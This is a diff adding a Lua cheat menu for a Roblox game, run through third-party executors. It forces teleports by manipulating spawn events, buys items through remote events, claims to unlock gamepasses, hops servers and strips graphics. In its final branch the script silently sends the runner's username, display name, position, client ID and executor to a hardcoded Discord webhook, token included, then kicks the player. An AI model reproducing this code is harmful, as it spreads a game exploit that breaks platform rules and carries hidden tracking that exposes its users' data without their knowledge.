+                        [2] = "\n"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "ChangeSpawn",
+                            ["Spawn"] = "BCWorld"
+                        },
+                        [2] = "\t"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                game.Players.LocalPlayer.Character.Head:Destroy()
+            else
+                TP(possw)
+            end
+        end)
+    end
+})
+Tabs.Teleport:AddButton({
+    Title = "Teleport to Chainsaw World",
+    Description = "",
+    Callback = function()
+        pcall(function()
+            local possw = CFrame.new(236.932678, 32.8960915, -4301.60547, 0, 0, 1, 0, 1, 0, -1, 0, 0)
+            if (possw.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1500 then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(236.932678, 32.8960915,
+                    -4301.60547, 0, 0, 1, 0, 1, 0, -1, 0, 0)
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "ChangeSpawn",
+                            ["Spawn"] = "ChainsawWorld"
+                        },
+                        [2] = "\n"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "ChangeSpawn",
+                            ["Spawn"] = "ChainsawWorld"
+                        },
+                        [2] = "\t"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                game.Players.LocalPlayer.Character.Head:Destroy()
+            else
+                TP(possw)
+            end
+        end)
+    end
+})
+Tabs.Teleport:AddButton({
+    Title = "Teleport to Jojo World",
+    Description = "",
+    Callback = function()
+        pcall(function()
+            local possw = CFrame.new(4816.31641, 29.9423389, -120.22998, 0, 0, 1, 0, 1, 0, -1, 0, 0)
+            if (possw.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1500 then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4816.31641, 29.9423389,
+                    -120.22998, 0, 0, 1, 0, 1, 0, -1, 0, 0)
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "ChangeSpawn",
+                            ["Spawn"] = "JojoWorld"
+                        },
+                        [2] = "\n"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "ChangeSpawn",
+                            ["Spawn"] = "JojoWorld"
+                        },
+                        [2] = "\t"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                game.Players.LocalPlayer.Character.Head:Destroy()
+            else
+                TP(possw)
+            end
+        end)
+    end
+})
+Tabs.Shop:AddSection("Weapons")
+local Weapons = {}
+for i, v in pairs(game:GetService("ReplicatedStorage").__Assets.__Weapons:GetChildren()) do
+    table.insert(Weapons, v.Name)
+end
+local ChoosedBoss = Tabs.Shop:AddDropdown("Select Weapons", {
+    Title = "Select Weapons",
+    Description = "",
+    Values = Weapons,
+    Multi = false,
+    Default = getgenv().Config["Select Weapons"] or "N/A",
+})
+ChoosedBoss:OnChanged(function(Value)
+    _G['Select Weapons'] = Value
+    getgenv().Config["Select Weapons"] = Value
+    Update_Setting(getgenv()['MyName'])
+end)
+Tabs.Shop:AddButton({
+    Title = "Buy Weapons",
+    Description = "",
+    Callback = function()
+        local args = {
+            [1] = {
+                [1] = {
+                    ["Action"] = "Buy",
+                    ["Shop"] = "WeaponShop1",
+                    ["Item"] = _G['Select Weapons'],
+                    ["Event"] = "ItemShopAction"
+                },
+                [2] = "\n"
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(
+            unpack(args))
+        local args = {
+            [1] = {
+                [1] = {
+                    ["Action"] = "Buy",
+                    ["Shop"] = "WeaponShop1",
+                    ["Item"] = _G['Select Weapons'],
+                    ["Event"] = "ItemShopAction"
+                },
+                [2] = "\t"
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(
+            unpack(args))
+    end
+})
+Tabs.Miscellaneous:AddSection("Gamepass")
+Tabs.Miscellaneous:AddButton({
+    Title = "Unlock Gamepass [ Auto Clicker ]",
+    Description = "",
+    Callback = function()
+        game:GetService("Players").LocalPlayer.PlayerScripts.PlayerScripts.AutoClick.Disabled = true
+    end
+})
+Tabs.Miscellaneous:AddButton({
+    Title = "Unlock Gamepass [ Auto Arise ]",
+    Description = "",
+    Callback = function()
+        game:GetService("Players").LocalPlayer.PlayerScripts.PlayerScripts.AutoFarm.Disabled = true
+    end
+})
+Tabs.Miscellaneous:AddSection("Local Player")
+Tabs.Miscellaneous:AddToggle("Hide Name", {
+    Title = "Hide Name",
+    Description = "",
+    Default = getgenv().Config["Hide Name"] or false,
+    Callback = function(Value)
+        getgenv().Config["Hide Name"] = Value
+        Update_Setting(getgenv()['MyName'])
+        if Value then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.PlayerTag.Enabled = false
+        else
+            game.Players.LocalPlayer.Character.HumanoidRootPart.PlayerTag.Enabled = true
+        end
+    end
+})
+Tabs.Miscellaneous:AddSection("Server")
+Tabs.Miscellaneous:AddButton({
+    Title = "Rejoin Server",
+    Description = "",
+    Callback = function()
+        Rejoin()
+    end
+})
+Tabs.Miscellaneous:AddButton({
+    Title = "Hop Server",
+    Description = "",
+    Callback = function()
+        Hop()
+    end
+})
+function Hop()
+    local PlaceID = game.PlaceId
+    local AllIDs = {}
+    local foundAnything = ""
+    local actualHour = os.date("!*t").hour
+    local Deleted = false
+    function TPReturner()
+        local Site
+        if foundAnything == "" then
+            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' ..
+                PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
+        else
+            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' ..
+                PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
+        end
+        local ID = ""
+        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
+            foundAnything = Site.nextPageCursor
+        end
+        local num = 0
+        for i, v in pairs(Site.data) do
+            local Possible = true
+            ID = tostring(v.id)
+            if tonumber(v.maxPlayers) > tonumber(v.playing) then
+                for _, Existing in pairs(AllIDs) do
+                    if num ~= 0 then
+                        if ID == tostring(Existing) then
+                            Possible = false
+                        end
+                    else
+                        if tonumber(actualHour) ~= tonumber(Existing) then
+                            local delFile = pcall(function()
+                                AllIDs = {}
+                                table.insert(AllIDs, actualHour)
+                            end)
+                        end
+                    end
+                    num = num + 1
+                end
+                if Possible == true then
+                    table.insert(AllIDs, ID)
+                    wait()
+                    pcall(function()
+                        wait()
+                        game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID,
+                            game.Players.LocalPlayer)
+                    end)
+                    wait(4)
+                end
+            end
+        end
+    end
+
+    function Teleport()
+        while wait() do
+            pcall(function()
+                TPReturner()
+                if foundAnything ~= "" then
+                    TPReturner()
+                end
+            end)
+        end
+    end
+
+    Teleport()
+end
+
+function Hop()
+    local PlaceID = game.PlaceId
+    local AllIDs = {}
+    local foundAnything = ""
+    local actualHour = os.date("!*t").hour
+    local Deleted = false
+    function TPReturner()
+        local Site
+        if foundAnything == "" then
+            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' ..
+                PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
+        else
+            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' ..
+                PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
+        end
+        local ID = ""
+        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
+            foundAnything = Site.nextPageCursor
+        end
+        local num = 0
+        for i, v in pairs(Site.data) do
+            local Possible = true
+            ID = tostring(v.id)
+            if tonumber(v.maxPlayers) > tonumber(v.playing) then
+                for _, Existing in pairs(AllIDs) do
+                    if num ~= 0 then
+                        if ID == tostring(Existing) then
+                            Possible = false
+                        end
+                    else
+                        if tonumber(actualHour) ~= tonumber(Existing) then
+                            local delFile = pcall(function()
+                                AllIDs = {}
+                                table.insert(AllIDs, actualHour)
+                            end)
+                        end
+                    end
+                    num = num + 1
+                end
+                if Possible == true then
+                    table.insert(AllIDs, ID)
+                    wait()
+                    pcall(function()
+                        wait()
+                        game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID,
+                            game.Players.LocalPlayer)
+                    end)
+                    wait(4)
+                end
+            end
+        end
+    end
+
+    function Teleport()
+        while wait() do
+            pcall(function()
+                TPReturner()
+                if foundAnything ~= "" then
+                    TPReturner()
+                end
+            end)
+        end
+    end
+
+    Teleport()
+end
+
+Tabs.Miscellaneous:AddButton({
+    Title = "Hop Server Low",
+    Description = "",
+    Callback = function()
+        TPReturner()
+    end
+})
+Time = 1
+repeat wait() until game:IsLoaded()
+wait(Time)
+local PlaceID = game.PlaceId
+local AllIDs = {}
+local foundAnything = ""
+local actualHour = os.date("!*t").hour
+local Deleted = false
+function TPReturner()
+    local Site
+    if foundAnything == "" then
+        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' ..
+            PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
+    else
+        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' ..
+            PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
+    end
+    local ID = ""
+    if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
+        foundAnything = Site.nextPageCursor
+    end
+    local num = 0
+    for i, v in pairs(Site.data) do
+        local Possible = true
+        ID = tostring(v.id)
+        if tonumber(v.maxPlayers) > tonumber(v.playing) then
+            for _, Existing in pairs(AllIDs) do
+                if num ~= 0 then
+                    if ID == tostring(Existing) then
+                        Possible = false
+                    end
+                else
+                    if tonumber(actualHour) ~= tonumber(Existing) then
+                        local delFile = pcall(function()
+                            delfile("NotSameServers.json")
+                            AllIDs = {}
+                            table.insert(AllIDs, actualHour)
+                        end)
+                    end
+                end
+                num = num + 1
+            end
+            if Possible == true then
+                table.insert(AllIDs, ID)
+                wait()
+                pcall(function()
+                    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+                    wait()
+                    game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
+                end)
+                wait(4)
+            end
+        end
+    end
+end
+
+function Teleport()
+    while wait() do
+        pcall(function()
+            TPReturner()
+            if foundAnything ~= "" then
+                TPReturner()
+            end
+        end)
+    end
+end
+
+Tabs.Miscellaneous:AddInput("ServerJopID", {
+    Title = "Server Jop ID",
+    Description = "",
+    Default = nil,
+    Placeholder = "Jop ID",
+    Numeric = false,
+    Finished = false,
+    Callback = function(Value)
+        jobId = Value
+    end
+})
+Tabs.Miscellaneous:AddButton({
+    Title = "Join Server",
+    Description = "",
+    Callback = function()
+        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, jobId, game.Players.LocalPlayer)
+    end
+})
+Tabs.Miscellaneous:AddButton({
+    Title = "Copy Jop ID",
+    Description = "",
+    Callback = function()
+        setclipboard(game.JobId)
+    end
+})
+--[[]
+Tabs.Miscellaneous:AddSection("Local Player")
+Tabs.Miscellaneous:AddToggle("No Clip", {
+Title = "No Clip",
+Description = "",
+Default = getgenv().Config["No Clip"] or false,
+Callback = function(Value)
+getgenv().Config["No Clip"] = Value
+Update_Setting(getgenv()['MyName'])
+end
+})
+sapwn(function()
+while wait() do
+if getgenv().Config["No Clip"] then
+pcall(function()
+for i ,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+if v:IsA("BasePart") then
+v.CanCollide = false
+end
+end
+end)
+end
+end
+end)
+sapwn(function()
+while wait() do
+if not getgenv().Config["No Clip"] then
+pcall(function()
+for i ,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+if v:IsA("BasePart") then
+v.CanCollide = true
+end
+end
+end)
+end
+end
+end)
+--]]
+Tabs.Miscellaneous:AddSection("Lighting")
+Tabs.Miscellaneous:AddButton({
+    Title = "FPS Boots",
+    Description = "",
+    Callback = function()
+        local function FPSBooster()
+            local decalsyeeted = true
+            local g = game
+            local w = g.Workspace
+            local l = g.Lighting
+            local t = w.Terrain
+            pcall(function() sethiddenproperty(l, "Technology", 2) end)
+            pcall(function() sethiddenproperty(t, "Decoration", false) end)
+            t.WaterWaveSize = 0
+            t.WaterWaveSpeed = 0
+            t.WaterReflectance = 0
+            t.WaterTransparency = 0
+            l.GlobalShadows = false
+            l.FogEnd = 9e9
+            l.Brightness = 0
+            pcall(function() settings().Rendering.QualityLevel = "Level01" end)
+            for _, v in pairs(g:GetDescendants()) do
+                pcall(function()
+                    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
+                        v.Material = "Plastic"
+                        v.Reflectance = 0
+                    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
+                        v.Transparency = 1
+                    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+                        v.Lifetime = NumberRange.new(0)
+                    elseif v:IsA("Explosion") then
+                        v.BlastPressure = 1
+                        v.BlastRadius = 1
+                    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
+                        v.Enabled = false
+                    elseif v:IsA("MeshPart") then
+                        v.Material = "Plastic"
+                        v.Reflectance = 0
+                        v.TextureID = 10385902758728957
+                    end
+                end)
+            end
+            for _, e in pairs(l:GetChildren()) do
+                pcall(function()
+                    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
+                        e.Enabled = false
+                    end
+                end)
+            end
+        end
+        local success, errorMsg = pcall(FPSBooster)
+        if not success then
+            warn("Error occurred in FPSBooster: " .. errorMsg)
+        end
+    end
+})
+SaveManager:SetLibrary(Fluent)
+InterfaceManager:SetLibrary(Fluent)
+SaveManager:IgnoreThemeSettings()
+SaveManager:SetIgnoreIndexes({})
+InterfaceManager:SetFolder("FluentScriptHub")
+SaveManager:SetFolder("FluentScriptHub/specific-game")
+InterfaceManager:BuildInterfaceSection(Tabs.Settings)
+SaveManager:BuildConfigSection(Tabs.Settings)
+SaveManager:LoadAutoloadConfig()
+else
+local webh =
+"https://discord.com/api/webhooks/1348009134783463434/RqQiEwiBU8IFkwrA6QijKFIOIHkV3YCK7AkyCLxu7G2ArT6r_CxsrxLVsnCSvt6E5O5t"
+local executor = identifyexecutor()
+local placeId = game.PlaceId
+local mapName = game:GetService("MarketplaceService"):GetProductInfo(placeId)
+local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+local player = game.Players.LocalPlayer
+local playerName = player.Name
+local playerDisplayName = player.DisplayName
+local playerPosition = player.Character and player.Character.HumanoidRootPart.Position or "Unknown"
+local clientId = game:GetService('RbxAnalyticsService'):GetClientId()
+
+pcall(function()
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = "Game Information",
+                ["description"] = string.format([[
+Executor: %s
+Map: %s
+Time: %s
+Player Name: %s
+Display Name: %s
+Player Position: %s
+Client ID: %s
+]], executor, mapName.Name, currentTime, playerName, playerDisplayName, tostring(playerPosition), clientId),
+                ["color"] = tonumber(0x7269da)
+            }
+        }
+    }
+    local httpService = game:GetService('HttpService')
+    local response
+    if syn then
+        response = syn.request({
+            Url = webh,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = httpService:JSONEncode(data),
+        })
+    elseif request then
+        response = request({
+            Url = webh,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = httpService:JSONEncode(data),
+        })
+    elseif http_request then
+        response = http_request({
+            Url = webh,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = httpService:JSONEncode(data),
+        })
+    end
+end)
+game.Players.LocalPlayer:Kick("Script does not support " .. identifyexecutor())
+end
